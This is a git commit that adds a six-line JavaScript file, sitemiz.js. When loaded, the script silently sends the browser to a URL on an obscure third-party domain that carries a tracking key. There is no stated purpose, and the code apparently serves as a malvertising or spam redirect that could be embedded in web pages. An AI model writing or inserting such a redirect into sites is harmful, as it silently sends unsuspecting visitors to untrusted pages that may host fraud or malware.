c7825dbeb9346ba18b3104fa5e086c8cd39f5869
leswarokojit <84512579+leswarokojit@users.noreply.github.com>
2021-09-19 18:11:17 +0800

    Create sitemiz.js

---
+++ sitemiz.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://tripsthorpelemonade.com/xehjv0hgr?key=c9955a9940bafccb93ff39894f51ad31'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
